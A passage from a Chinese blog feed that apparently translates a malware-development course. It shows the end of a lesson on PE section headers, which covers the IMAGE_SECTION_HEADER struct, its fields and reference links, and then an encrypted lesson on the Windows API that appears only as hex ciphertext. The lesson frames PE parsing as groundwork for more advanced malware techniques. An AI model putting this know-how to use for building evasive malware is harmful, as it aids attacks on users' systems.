PointerToRelocations<span class="token punctuation">;</span>  DWORD PointerToLinenumbers<span class="token punctuation">;</span>  WORD  NumberOfRelocations<span class="token punctuation">;</span>  WORD  NumberOfLinenumbers<span class="token punctuation">;</span>  DWORD Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_SECTION_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_SECTION_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个元素都非常有价值和重要：</p><ul><li><strong><code>Name</code></strong> - 段的名称（例如 <code>.text</code>, <code>.data</code>, <code>.rdata</code>）。</li><li><strong><code>PhysicalAddress</code></strong> 或 <strong><code>VirtualSize</code></strong> - 段在内存中的大小。</li><li><strong><code>VirtualAddress</code></strong> - 段在内存中起始位置的偏移量。</li></ul><h1 id="其它参考资料"><a href="#其它参考资料" class="headerlink" title="其它参考资料"></a>其它参考资料</h1><p>如果需要对某些段进行进一步的澄清，强烈推荐阅读 0xRick’s Blog 上的以下博客文章：</p><ul><li><a href="https://0xrick.github.io/win-internals/pe2/">PE 概述</a></li><li><a href="https://0xrick.github.io/win-internals/pe3/">DOS 头部、DOS Stub 和 Rich 头部</a></li><li><a href="https://0xrick.github.io/win-internals/pe4/">NT 头部</a></li><li><a href="https://0xrick.github.io/win-internals/pe5/">数据目录、段头部和段</a></li><li><a href="https://0xrick.github.io/win-internals/pe6/">PE 导入（导入目录表，ILT，IAT）</a></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次接触 PE 头时，理解它可能会比较困难。幸运的是，基本模块中并不需要深入了解 PE 结构。然而，如果想让恶意软件执行更复杂的技术，就需要更深入的理解，因为某些代码需要解析 PE 文件的头和各个节。这部分内容可能会出现在中级和高级模块中。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.Introduction To The Windows API 对windows API的介绍</title>
      <link href="/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="87f6cd3add92e5f681beb51e2a86bf4fd7387a34d555675e20c6c8bd558de3d2">2239f6ef2369263b61ef594c41be1d81caaad9e00dfd39e2e6679848a71a75425b783f2084bbe71c207ed1c250fb2ed6cefc9a851b67880d7dd7f0b02318ccecec0a1f5749dc5908d23dee16a3508513fe37119411562cbbb5d634a272aff775a373ac98b3884e5a190f33cef1784e3bcd55b845840ce435caee287f5e0985dc1659a1fff3db5bfcdddfea676c453645b7d4c98a9b1c95d15432f8b252ad1a76b67698a210307ce111a38e722a06ffebd1809895bb82b7fb05ac1f50cff9946dd85bacf2725e66c11e2957861c51f1759e574409277083776ce4f541088a49cde8fbdeec86caef1640e3edf36052b7844d91356c43c855c36e4f7ad3a694c96f5ebe87e6b194e2f90024d9d1d2771b3068be6dc6d3751fedb37195f2bd1bd5dbadefaf754089733c95e3c1beebf4ff8808bcecb137a06232f5195fed2cec55b1a0742e44f105a78ad5df49632acf001a25dd3aaf5db7427a7aac35f293943ade5c6c5771606e8bd94f836cd262077a908ec9bfdcaaffe13da0848f4b2b3e7ecf154cb8b9ebdfe2eb129a6c936a97c6c82428b6123a25c310061bd419ee65d8f725698fab26a23d5baf1271a123a7aa029fa2495c968596a107ed20ac5ed04f02a65ac1e66c870943fd44225384ec87bc5f4a43bdd472f9c10b11b3895d3b83ac9d5443a7f9093f80376fe98acc77fea3e528544c260dace5279943e672e643497b7cac0e7935d5caeaa991c4caae60a395ce0dc4cc9e339dec70362324e165e056568b3d23924e644fedf187abafc575f99bdcd9b71a99ed681fce5f3486a3a753501cdedbc1c96e8356f9a409f7ca20969b3326def8eee0d23f42aa8e02263185906e32c060e317fc29e6df6b2df9e826a7579579515612e05e8f891b5cb64a62a35f66f600bacfabd692b36f3f3ed867b0a54632387862a62e18a1510d759a36233299a28c4ed0d890aaea9207d5145b7659944f1aaf0d6e006be8e3a353ddf717321f04c33ab5404f4f40a5b501d6504933db1d6f934d0580f4065c756a0f3f0834dc3c2580ac7b4265d8416f93a7dbf6b0c6cd31311013b607ebd0896e3b0816c22455659834728b8a13552c423575d53fecbb431f3a48950c2daad44f3edfdf769db5233b6cf4a4e22b1703aa66a5780bab21f20300400345fbf86d71c802814ee8ce40ab31de38566a17753b237fe1f7044650a2ba3aec9e40d3e74eccbd0bf5c20fe5ce165c7188cc207c2f25da259e643d0c1bad4e49b3001ce2e6235894c9cb745e6561b49b7bcb0c433eafb0a0ff60ef3b415724022286b06a73639a98d7be0a9c915350cf7d1f113d2179b98129d49aab577544ccc00e38ad076e5049230997e7ca78da99a6a87dc0a3d457757a8982ebb7d7718c0b0cf78b3dfd1cd67a8a32752e4d2cce8fe58a137143f0dfa9d22fcaa662a9abc03e02bbe2d78565e443bfcec917d6d60114d603441a9d3f0094ae5934d35b7e40a6418abcbf0f98eb8b0b1399d043dba3a6bcc02fd4150483d42f2e313fee4ea006d20c562666f818dff9dc1a2ad60a900ce41cc839e2374d48939f1700821f4fb7890c96a0021b711038fefb0d0bc03688c909a30891b6118447199890f120b24c8cec74312577225f1a500a83d76c60b013381b77c1756b2c6651a76e325e9b25013709b7c5b7c7732bea0760bc58a3cacf3369debd1f212a8ab157aa66be0647fe60593ebe748e3a764b4fdefe050e5aa6c1a6809ecd33b16bf1753243cee9e67320937ff7aaa312a409bad57e0bd2d23e36bb0757ddbeb54f40deda80415bb2f6a9b93ef4d515536b8ad6b63d13eaec768a88d92f4adc25219117b1ff30f6a321621330ab67f0788e9ffc5396966b83b16d7c6c413c4a13c928be7997ce1dcd57785c9f66680d8b481e2ca87354d51188a0300f26364806d70a9dae012ef08cfd6d2500133cb58aab96ad8baddd5da5b1f447ce9d01021198c602b213918765f2eb8bf29fbe89471652bd7b024adcfa98a68e9feb8e7b9cc95745fcda417b61274992ba8eda0769940aa883c25a1c76d552ce50364bbce01e41c2dc65d696c2bee88c73f7b2037123ce61a9ac998a652b9efa6fee094c096a21d6006160feed55cdeb392e510c073486625863ee76ace6871c703c8ecdc12f3ed391bf9ec3a390f92ad2b31d571c43dbc0e6b5a0892eea67c552e51da944d664a704481d78578be7e1db2ac8f8236e71aa87bb5b28baeacaed9692637f4de2fdebe93e15ba3ffff86263a0e1fec3cb4d966bfda635fb816aef1f7d9b86edaed4b224c289cddf9ca819f3316d40a8d815076dea02002dd57305063d09b93763efb1990b93f0b23252226cd268c213d9a01e252025981d011b04058bd1790141c836b60edc54bf5f20e81697281b05b4a2788380fe027ad4b0f144b4f75d5695a8ba12800a77f02743ac66639da0464c43e623e58067e370ac260e93e81d254ca4e5117208a2904f4bd5d9a768159deb4dc04cffffb5a2e2191c24104b350a2133da0e0e2e279d43175f07d2f39539c4f58d1600730b6912179208b366eb55e646df50da19a2bce8ce927d3a8bfaae99ac99f80734437805495ef6d6f56f5c492053bed81c0d8e340c6118246436bfbc3ed99bcbd9811dc64080d813ecd5d5a005bfe9e5a08579175141f8479b5e3644f28778b6e11a4cd12a248a9b4fe5d5f7db62677be7b13ec565c122e85e5318978ca9e9506360202e25a4e437ab7838f07e417c9d1434ca068e4c829cc6777c93c5b8772afca15d9c5fe9919aac9f22c875c88b9c10b4a8ea18f69df745f34382346b0dee984022b10e508712fd2267e430f4e33accfd9b6b3a985d89224da7602bd1101a99a05be8f465389ab5c1bc384f03aebda366f614d6eb43b6ecfc162b7cda3e43d4ea25b192bee03ab25063fa014ed5a35c8940322c07ad62921d8f97d04e6cef407db5cba6c2802a74aee5c730db75cd4ab7c1a76e06247f7c4ef04c8facacae98d134ed482a3a826f80bdaa4f23c6a8088e7e6e40c87a38f442f0c67923b47577b5b81d32617c76758722d50e938fc8a5ffc739f345b7502db645777a7923fff36f0d78cafc75317aa3a7ffae25ff00a9e8dca10d7e2d4a7127c2b75a084f4f066107841d439404b31219c401d506bf82b952598972b8513bf3d26a4690069264dce6f6cee980c06b657b439255a5c9da67bfc0de7c992e6118cd1c2388ecfa438c904043b227df1eb73a03d1363a630afc61acaf4940a3244c8350d4565a5d53b45b6a1a90c9b22e4b8012f9baaea969830f7f5f920e435fa7c2659918439b563b419000b3d6fd7f29ccb2b14ee10e2de77a95e57670b0743ce7966dfc63607226675b38cad45102ff13d0a3f23189e1abbdc83e4213537dc78f96cbcc5f6383f409c5346d0b4ee49d900eb575581f381fcd87bb42d2e35b122b1ab4f75dd3ab37deabac730a513e43d568c277fa7a8e84516e608c0496892d6bef3dce5d1529aecf7dffdf1ae96d8167047e6b9d3333d5ab6248869afd813097df19ef69222c6d179c098cd87816b4251960da117ad71977ba63e6fb7f26006f6bbdeb00f6cf60622eaf1a77b460193d092f39a9b647f7ebc79588e5114a3a3c71b1c943194c4bcba158ce32301daed34f8529b71c212fe35595fcfea8b29fbea9e04641a99e5478795adec44d3d8ad07a8d19dfbd58b8429e8e3125df1ca067f05131a7210c2f2b0cea20b5c8bd920d10a2b9c2ec95130b8fde8c42dbad5c2ff7414c2b347cec5ab378969d638ae23f5e1105e67b0f58fd8a4784c62b0a0c7348639e2fc6f6c2d4c7f87a8a211e9270b2ac2354bb41a6f6967c33ea2ffbcf83787c7ac1aa217da2cb02a6fac446a58d6eb39e54991de964bc8f3f2b7ecea7f88e8c378f6d97bf1081cad2500b617e939e7d1d7bc15292db4f65ae9e2975d7b75211e7bbc888ea0ab79d38cf4e1f10711616260e7c3ff2a85117018e192e806c754940a4c2809723246fbfd022473eb68402c93f1bf352fb3b708aff1197bf6abd637126cc9bf513984dcb14f1fee28c986d660b8e20559016b73caddf61e213b8b0fb6d64c41fa85bfe332caf33596ce86e5edbfb73841a3d4bff76a13f259e04cb39ec1a2fd85e45ce2d99de21417cac4f09dc0555f5206ecbb00e82965ebb15eb35c1fa5d14b6881c60df5d922e4475cf5d030c02d214cb4064a49c385ebeaf2f5c0e164a7cd9e7aaf982ccab8eb16c1a9fc6e9f452d7f2a253daa01e86f5ec05b50c8324f83f94e7d8d4c8a2ec50878a3983508777e908f83f540ca022bdf4a690c71fdef41716c08440e1aa57eabea9594e25dd96787d7d3fac43102d54377d5ce342cbf38e8f72ba3cd84b2935b887ce174b7c1f7a47a13ea3a50137ed7a528cc1766b9cf2c2447ab81f8be907baf84d32296c0eea798a388b4d3451e0205a273c3ad41f8dfdfc7837de79928368511a3895d2fc82579f4f36186329fa099a091ff14b55a5fca99fc02a605c1afcdbd6e9d12b1f7cb3761fc776188c445cc9a252779e4341c25ee07deb7fd7950b801f37ba6ea14ca575f6acaf589c5d1712d73b8a4d3daea840bab446958aefb7c63fa17b6bed96067011ee65359fe9405da26dce5fa217369c64bae9d3171cb6c652c766b878d7f54942f8d10f909f9d82e3e41d4259867afd35feb53eded82254acd170bf6f663c9732b4108492e01186fae2137d9d9d779cd4976f313a3286ca7f6f416933f212c01a9505a6f9e72465776606bfa32149621fcd96aaa1badd0e0bf6d0b52f744d4bbc4f19298e5fa43c136d232fea7d2e699a27f00d1e013e02d6892f7c45eeebd33d3b0dc5d85ff0ca2477c31b4ec1a18bf62d2dfb4f94c4d69de4758550b6699b0a4aa1a4f4219515a76f70bbda2a82d93729df65cb5c23aa96ff6065cef44cdd988ccfc39c01fd761f475509bea1036aaecdbbb96329bb5ea32d658b151434b6a6772b330c87da006da3930b48bbfb735785179163eca0e0815590a2807319a21e9d2887e94d8a674868f932d6ab34eaf6b8463f684bdd33cea5c6f6c2f8fe182ccc61b94f1a9c7081828643aa027c33a4059761c4b9465edeb56c207d1a2cca1e5812980b95e0a6581cdbf241c477cd31e188800e2308b6d0ae0e0d818e54c4268f72baaa41f80668cf85f9060bfc7a46f1a3c07b106133f78e199b8e01f49df0eda8a2c909ce674ecb0884b02e4930d7aa8d7fbc18e89d79aa1146c5c0c3cd405b15c34f76d7f02149146f43f698af8826cbb9cd4b635c1d457173c371441f14f00a0c5494e50f60bf06b75acac3ff91fc18fc7ba7e84b33cc12871dea506cd5e357860bf9b5ee45277a064e52c008107d72c36d285e4472b1c8efdd5719927f8a8c587da89f85d7fdc17a6e3d7ff028dfcd1440ee9f50e0a9bac3f34de8655c1c44506375ef445ded4b39e02e37c4c0a7055366682e06ebf6f1d21f43b8bd5c8e10b505f7d9a266e534087bcead509f10c69514390afa9d019aa16c5cd749ff1951fd73e72efe84786e30ba9e5f784ca8e127fb24cd823aa814af6a52139c2cd288cc7a35140582361f7bafac3de8068d0275a94315114cb7f23e2165cefe62bb2c498bdafbe3990c44b651bb1d1aea78a55fe799296c729dbf034ce5b892ea8cb6948ae773ee53ce130e5f802566cbb321050d9991975e04746179fb3f080777f4fddaa5dfcd88cb2dd9026c553ac27fd12cc3c1c733a6951075258a9e9ee6a1569732e2774acceb967a441371efdbdfe45272d657105006f1ffc8b071997b59c2c9261f2515c90842716710f8b2400521a5fca521207feb95e6b0e715913d77b9ec3451409b8beb4063503b65d4d5b93b6f2b78af5f1686a82eeafd4ae571d257d2e3c8a61e863e750f18b3657f58458cab9128cbb29eb78611d9d93e4c0278e4dc08eecd14ad0e96c41a9800bd98eed74dd8d5a43c203e367fc09372015c2d4b423e1170bfb094630f2d1b70afa420fc6b234038a77c3052bb61c7c7d25d7eb43f526470fedb6767d7308e26f46f85c0072adb669ae1a2775f50bfa0115861067c85ffea527858eca904805395ec67bf7d9237463bb2120e7fd966d2a8b33f29a473594aadd9fc0b8dc35501e5916fd1732f48f9ef49ead8217edf7d8683075fee821e14efc198a6e5b75eac31ffed669a565834aec934eab0d2bab540568198b684de2ae26daed1c56de74e3c95e973f0b01a9720dc2e333c2be64f14f4dee0d09b02b1174618bc99b2bc35596e4d664697b17e8ef9d2a496274f4c44192f7569d38123ebc7a1388218f1c83e24b671b77252faf27e1ac8b9bd9a8c716ae4a050d9f8c6d72d7f4a2659a44cbc150edf304e87144676b934be6a2a3a4af1fb8db46be91ffaafeccf5cf668548df72fd32b00f80826facb356bf3f3738487ffd57263c5e2e5205a4a335856d6660c50c5d5eece6a4b2b7e7f8fa600e88e84cddfaed5eb1d08f44a68e86e33219bce0d3d8473480293f5a2f94271dbc556dbcc7ecb9291224c438c0a8bd050d5e727556b6d799e9d5b302b11419b3f71ee9cf4fb28bde26d3797432054d59a779a7967bedfc9a34e4810bd79c6a19ad1a8e72d854a8cc310adc3c30d26ec59df5a2782983711080188e0569436096ebc29293c41fd42e1a9514cf73ff49c6e7b120945b621a0175d5ca892c72aa3d5a956da01b2893b178b806e40b11731507821684292904fb88e201730966308c63776d40a0bc48a2e08619b41a900657bf103ffb2ebdc8b41469ce18af66612a87706f301c6eaea7c03ffafbc7e285a87a4d9fe9ab5b137847ac5f2978b976221c420c877da5a0f732866f5bd6c543ab6f7fef3b212b97e3df8c15608bb98886e43a3fa5bf2767881633176ba51ce87f57a1955bcec8702ae40f1164a11fb2f1dab8819acf9e0e9ff2e9cbdb747a68641b9acd3f9fc17f9fb757882869bc8a9ab85de06c9ef42364caf666e08821843a54f4073919cd20d723091e19fee342a743144c71bfa4358a4d93dea3f047ad6a80efd92256d268081205d22b848bf4a6998218d6cb136d16df41c8ccf6196ebbce180897db61552199d2cdf3ba7c300c228fa4a1ca2ea47b1af0cc3543f02bf232864be4276788de1ccda5cb1786ef3b6d708c23148ff959ab1e011ace6e535e579a5d96ec4f8013a06f451f42d17b85c2e2dba221f5547fba9b6972727c3abb47e3b0fcd7f5726af1ae387727227e3019dadb58bf330776f4a17f95ab7eb1349b498d97cc343dd3b55d01f744cc189fead455f0da6211ff97baec2209bfa7053b0b6af3f07befc4e008a28c9899fbc01713ced8e3c50e03b8b06764bedf74c97eb04d400fb1cf746fbb41624d3b64634725ddc5c0cf64d8772454f8201fbed7fb48a43a3f86ac94d361e64cb11b0cf3ed705cf546ea0488ca2cb0d5bc04b1c4da1cf9c489ec063bd5db12cde86319b085d5632727a93e1105572b84fc8e0cb4752579711fc84a1de1aff3020ccd8dd3958811c60dc22e0dc70c08f4b64eb627feea95223d2d81ab8faddf52c551923bf0dc3b7b5ae014b59f9291762dfcdce2777841d8ada92f88e4aa464be3c31b4084f8e8be75101b305dcd186a2f740bd45598eafbe30be61a5274a585e5214ea4d1d8d70466ae7afc7b1e9d21399dd082b6aea7f77c88cf0e36be827c3f46fb5d43d0db444940ec14723b173ea55a9428aac46cd5e8e9dc0c7b3f6ec24c4351681e927d2b831dd11c041e9eafdb5c392711a55f47921d1f1ba00eae47a6213de64ff13ecd350aabac2a264e8178753e1c029e8b72658005bcecc8f3c80f6406f711393fe7017ed5bb014293bfafed539b12eb8313ee80fa5e719a057cb1e053eab392ff0c5ae1da76b45005d92849b1b44cad236380403ee81350eceff0dcf1006f9a271dbd89cbf7ba793d3eb3d0f08e90be8557bcea0e9777dc650b6740db833619f6d41570218cc861281ce4a045def2f69b7c2a367370193f3fe78a3edf168535b52ac0fd5bf013680a9cf88f66e89ec50cdd9d1539664bcfca0ae6c3279c67089f052da422c65a88a991bddb74b9462acb8d486c2647769368712f21b401f09a9dae3f30b4ef0abcc3129b8707b3f5e8d3917560b1027e2a339880364eeebbadc5ee65adc623c58a39f96114d5838f6120eacd44ec39c92d726a2783670e3a9d96bf6332c715c76c78e92d396f8383d248773c1bce0d93aebe399553136bcca51f81b01ed7b066cb531787dfd29414c39994e419595cbf9d2585f69b017c670decabb7c2a947ce63304a5a16327bf25f75010b0dc863405904e8bbeb499fe2b62c9538da94ede3666922ee3e8d55f8ec78db645f69f166ee00c8f732e0902f3237fff65efdace5e06274737d6dba8515423044c605e1244e820b516ee033ecd88f4f56ba6d7436b9ec85448654496e0f9f6709cf5ebb23f14887beed0063d6ebb1c82a9f9376ce1f903266cfda8c31b89b67fd8d3347a3accaa43aaab062f4441b7f65b6c0aa823f293866db3c9ecbf61de5bf9cceabbcb4b7e7f159bcf1de1d7e4addf58153cb40949e5b523f6ef377ce8d59eaa9c31456f3313f6a7d1ba1d1b9e9c7ab5f5ef0d6f331a3012fbcd39c0877a561737aa245931c67d91b6d2e60b86e2818ba1b883865771b61a468cb4cf1c42c930863edd0d5a0c1aaecf5724a11bc2d69ba7fba3caa2bf8def8905ad95f1eb503bad72f3d465835091807e01dac6a48fcdaeb9f67fdb9ecbe1140b69954b2d68cb95b020aa04e5fe2e6dc6d2a3837da1c0193adb8036d39b9d156fe1b338bf39eb871c1907de748e040f66453fc8ca6ec57c9a71e5ffb79845ca9f6ce78909e958bb44ea1af0fe7ef8fc0ab472b6976c3bfc39b9bf4fa5a3540955a521e714974b0f6d7bef54282221c30e846471a6c8672b8cb5e82c95bad42fb582efac5aba5f32f80e55513058f511efbbef64ef4156283d614bddaf4fd943b7bd7c3710da80f62d16a03b192dd59287efded017d1a95af97e358e417586805b2d692ea6ae39d22f75976a8989000a5bd5779d51616cff0a756da74255a35a63534fa84d58479cb610791ce5520fc08275b7aae44326a09b38a18d4241323c06be6f88679dd2b1abc3377784636a797e655654d1a7294759d8536a7d934626be0ba214aaa873e759338961fc1001dd119cefb680f142bda098aa0285b563d502b97fc86d5a5afb57de78220c6e73e4c96adfec3f7c206de5bbb879093ff6ff14cac117755a78b42b3b2443376c220839823cd5338ca1d4bb7c57a76f3f617d327b9ae64f0d68b72ce081648d29e2b9ea873320284e410715a2bfa9128e5896b6dac307745628ca39eaf9fc557637d25a93c061fda03c85df3f9684f2902b7295c2c3ccdcc2c13003c1dec994b7c5166529554fdeb05130b81a900683fa757604e19e68282c361b0150054a80c8af071d4ff0c36576e0541ba64fdcf89de5ab84dd2aff6dd3561d0751cdc23507e04f9b5d54ae6d6ff3c83bee50f9fec266dd115b7d2474f6e90e2458e02b6d5f3f1022533e18321296994e0a44dbed306b07705595817e34c7b2ddc7616c92c9753985be0416bf19a2cb00713ddd0646b8813bbaf7eddb8770b1b8dff3c841793e56ebc8d48c4bca5b3b78cd6eca8cce521ee2b1e146e07ae068604ba86615d003e4e256aaa6013c43c90cf9640b10256aa9393a4dc3e9af36853c0ae760202610ba66c9d248f9efa7e34e82e9519807fa410f7555b3c787fa120b47767a503ba642e10700d8a08cb220e56449981a4236a89c61d6ce6d81302c72764fe20cb306e61eabe379e66203a9d19c5dbaeb80bd16879ad36c3350a76c3f82ee551289d5503fdd1b93b969a51c6250362ef6bb08569fa844a8dde53d05cbc211cea4aa6c29308008dff7abfc9f646e0e3e718c9d082b66b03691dc7a49cd5a9183e827509f38efbee585f44df54d465e5f9ea544b08205e9f92f6171fbc47883eca3c37192b05de2b5d10afd59557c8837632d451de2afd4cfd8b697a4c99d18599963a0b982a9bfd07bf08049765cc397fbe87e8586e810bfbfbad2e5355e56e678931d062cc72685361f080831ddd20cf0ea57f0e283eba62cd02f19863e3dd789135c4e19103515156f20853334d606ad81c24e97ce59bd6afce35bfe600a0d5152a5ca60201936d9d226df4a9f9ecaad43992924127e124e14699ccda06ac2cfd3bbc56127f4ffb9de64bab4ec07f84936ae8ab58ceacae118dc007bf249b865d9bc5c369dc7cfeda1ae74c5801d2d79b64d5ed54877bd122b815b2de9d5a5d6968808d3ec60c1d1c633a4325945bef7e1b168d5507b8b7b5767686d361bffb9f6bac1aa4f6be62465b50a2fd38d04230d767e7cd0bb987c971c1d0089b010787c02da430121c0f8b010fde9945035c97af7c269a38284027728a6e2daaab2959b050b61c8c5ccfee625bc81184a607c5bbc1c78e93db5d5e92575a74368bd8ac5b0ba9b93ce7fa9f6f06b0434dc73253dfaca4d90ce2d751e6640a424a9fde58e927cb337b17eff1bb1d5b79da691dcfeb812b85ba39015741d6151c52f274b1d89651a2b41bacaea434bf789e10a4b71ea472ea05df5c9d188f530a3a9824eb7c88d8800865b79ebeee35c196256d6b546ca064d27c1d729af531c78cecd60fbdf81bd7089120a73e87727047f7745d0e36fc792961ae8f80ae8433329a56eba2bca5d59eee70b355655a57dac3e1abaf5b3c8222a7df7f144fb8d83dcc5d78927441792bf16c525f08308bbad178544ca475552e7ca197988d9b50c2a6bf43d97b519c99c55b9858af3f77bec798a5a14191907f275861131a190f0f8715e5208e5fe6393b57d19ee2acdba4c738a63a1d5d3ebebb5ce12e9b603b45186cc6c15708a85501e0ec1c9a52b47ce21bcd13dcbc6b84b83aff11c983414f61dfad836516c97a5214930b8997bf20dcfe16cc20aa4b3892889c2573f3d23be7ac15e91c7f0db9720ce484bc98d2f3f2e12714f1302a450f6e33290983234a7241b3da48047ef9416d73f053f8a88754dd085683898db3567a32ae5c09d27a14802c49deb1d3d4d012a25fba588658a8faea81f059a43c72c0779eecd600408bbc79e3983c34022694baf701a883e2feb1806b8388628c2d9f79b8d0ef021ef0054c1a5f06edaff4b0fc3b239a537a83c2e0f8b0efac7998ff5e76ba61f5152c918af1466118f4ac10b8b84278e0960db3e23e50ed05eb2af15d9bb99a7fa6162d5d2b307eb4c932988fb1552e5faef33bc441e85e163d84ceafb4d47147a1749241522383ed4bb67e1667886486667ec93db5c921c1fe8781983587b1d1163af850ad5a66214f28fac9d7b2523a1657b31da66e387dbb1e2e92de5c55ce285c2d68b44a40fcd6aa5a59321f2e42f4317d17bc83e288343c0a0729adf4604cdfa69022f285d3b44b9c5853531487991b8640f16054340e3edd7d3539c18628931d9b8a3fcc0f989101df760d79a4b90c69ca6d9bb9de1a44f7b7d0a0922aaf14df7ab5ee94aa612e940e0817cce1e572ce4da8f74af3f399d24219d0b6161d0a139fd238cdd9eb24bdd7b10ca2a990e12b99c34bd400a12f122e642f5a17ae08fe4b9064fa79e44c4ce3640a4fa8683fd2535e34714e3aa12bdbc83cf68cf79b09ec1967bc3fea5d129874ee80fc19096089c6c78b7025b63fad3d5ae403ead9674e9ede236256d2986566fdbeb77522c26e655e3ce3a618cefdcd829bffe320aeeb05b784afd9bc4c19504e2978af80f96487479df632513fef82664d08f14e9d78a3052fc4fca37764dde7dcb6f63180196684cb956b12db73ee1b3fe16a0e867d9c71606736f00ee38e2df7372e1fa88fd1b53383e17c837926ea5cf08e6143d413d9da35af0dd3ac7fc42310e3cfcbaac86faf4b0c4980ceaa77628f5300b35c0b71515529c29818f36db4d762858a57010b5824374c546e5eb965cc867c49cf8f7c6f8408a01675c27b2f13052dd1850848ff181a0c0df99d13508441aa1e07096bcac185aba1a311d8984ee8de2b345ae69552fccad59516692da459284689eb811a4d72d52da84a3f2c048b0f8af6316fbcf8b50f243c4d646d130fe518401fffe9095df9715d4ee01470812d5599716c93c420fe8f89453df9c89f48b9832372e65c62e783d8a6c85c39223df73e372f8d68617ee11cceb13fe46e55e16d2ea15808ec1a15e78aa6dbd394776a64da78205f1886beca532f85941636b706e1c50e6de183282e40e39338eb32a61245ba27f443dc80bff229fe5e0b20680a8081e105145297f27dc91781b689e281e3ba8c616aec638423992fff9c49364e633bb332f6785a16b7b99a6bb977df2234e69f05d338505042aa8adca8eb285eed6266e6fa10fb40e75bf3c71751f7bcddedace44bce5d98d70d40ee0dc3c8cf4489ad0f4d5e67a89ffba12e2a18a8a4a48136c3f8fcebd9cadcb8b9e26c12acb5fe89c60058f39fef01be250a23c6aa1b04384c9a586c284e1bb275cfdc11d48423d3202f9e29479ab8a5395029de07768178579ab66a222741af8fd298002bf9258a3218a016f509e62fc6d99353ad74059da60e616f8dd36ce7d3f9625abfaadcc7d1972d81dc3650876a4d86ddda944c1993fea58b9fbaa97f35ee50289c5a61d0b489bb8e585472d6fd442edd72468fc625fa068596a3fbdc4379916c3cba5e254ebbabc4ef0404a7bfa0bebce17e4ab0375169b9028d8d0f0453e45fae59bddba47d4f965091f3350449e0fa406ae1e65b7c8f202e1db010b6e3a1fbb36ea72022ef13647c8a0cb6ec90f1a411b9fdb837bc12ccc906a74df5077bcaa191eabe48d11be3d2608a63c8890790411610bce511ebb88014409d9f8a9a5164246b341cb5b41dfb4fa6c24f67fa6ae47e995a0f13c56f2c4421a01321455f29711cedfe4d0a2aea613d3f9097cfcf12fc5ca031205efa566caabfc089183ec69cb20ced916a633fe9ed23d2909587adeb5a515818fd8337b777e9e291ec8c5bc038efb252d1dd99d936d9667d3c257c7bf5296c2dadf111fd490b8854f4441f5518eb6d08ec8f2d640c165bafaa098b27afef5b56dac105badbd187e04ef61dc7a55b978175455de534c0eb7f9cbe1da13474a567bb403f990812a4e0df0e3582a0ae32041fb5cd2b973a7bff494906b787a0e7415f1a5c4490f55caae9f16d45e61706e90b4bedadd5f050162ca19d001997608f5c2c8f42a29b973bb866e4693c1ba32e6dc5781bc5db6de0b9bfe82dc9fff186aa7bc2aeb07fdb82965d59c346d9b226eea8d31a374be5dcf32b361e3106da96ad5d3d726f76356ede8f9a180a3d7a947c0e7db2a29fd53c5aaa8e2c80c22d589785537f112f42506ee8e30b3b272e4f0cac057e26209496d15e644b447df162ca289fe264f020d9280a6244d1d1fe0943494e031c42e8029081ca90f5bad5604e94eb2572511061714784bb65efeb35437016a683c408513ce568dc86754310db3e1dde0f7c742f0f2c829251f739e066300fe99b3f213f0b148bec65a4e0009cdfdb165899ea3b3b27f767ce419e57a98656120d09f62daf93684ff65b5a874a2bd9432785c45b041e2885cbca688533e9ecfa4b0c28bdfca8bbb98f710706d0e02d72df703ec204000a042260f4a634a6ea6b56c054149a789146fa38a2e0ee8d58967aa71c8702220c68b246721215b7674adcf6d992dcf6254ba3f96da341b4d889258e33131a43a73107dff035dcaa57e1f76a2628102252e217e1f16c14313b33a2b3507c23260895aede1be5298c1cc184fa2315d3bb3c9129b8746cd1f7d33f711c87ca38b335b89d3028a208b646120bbf44897ab21c3fa2defc95de961fed2843f7b77113b5ea09b2a71f36529c26c422cc683c4c9ea2a829a9a96b48188168681f95257139e533b452329c1d584c822697779038895210b8244978e7b7e6eb529057b65d68a15c1f949648ca0cf4079706b461bbea19886720ee67172a846190fc67a626ce0ebb7c449ae98008d91fff5e88bc9e1e0328802ee4e6495352543076e1da8102813e04b75baa142f3e2797d4b157e874cce41426910ea7851628f58f4caa72104d7af1f815d2b7119a7eb216da9a033293f042d28657a2441aa3f3812c484b45dad0d4e1f1f82a7181ac5d216b2693a5cf79b85055508339cd1d4ff81d9677f6a2f7e8417d240d4ff5714c9227ddf78031333664427060747cecda990ff99d1b843863611ed7fded0f05c8cb992bc61538ce575ab714db8036a684e8399f101c814d918da2992b0438e671498b7a7c092057587500605b6fc46af9e822449791f3928345bb1d78d2d6175ca839aa14805f7fa8850c5ffd4c2039ffb560974272f89e6d4902b1f11a00688824fea4029a197e908f53e57125925b964c48433cd2d0d6dd8fadb5b5413f742f59ab5de79561a68a386e5e75e28bef4c9f2aa9fa7cf87292b9a0a3bcb5284efbdf34e7e002cfcd1ac6915d64dd5ec781c28ace1f0377e9428ba2489301800343594bcea1672a01dd1a6493579d538062b4bdb9d0e9428c1a4861710dd235d7145724fcbcbbddafe04dc6e1f6efddff2149048d7a14a9ed5eacb4445f7dc9807e45e8c6443f6fe4b303ba70877978b22a93326bf4dca768ce6bba8f27dbbfc337b73418bff3b5848597c8e5efaf627ba61f71cceb413e888ba0912299d63909d051ebe0c89370c41498e58342cc54da7575578589e7f67e471f6600953a6680ace16fdb9dc182689223e9c2a336648f6256bb63bd5b8f5b50b85a341007825b3448f7a247418c04a546416fff9ba71f495ff4fa8086c030cef23e84055d3e4e3c837a9f3623eb77f659b7a151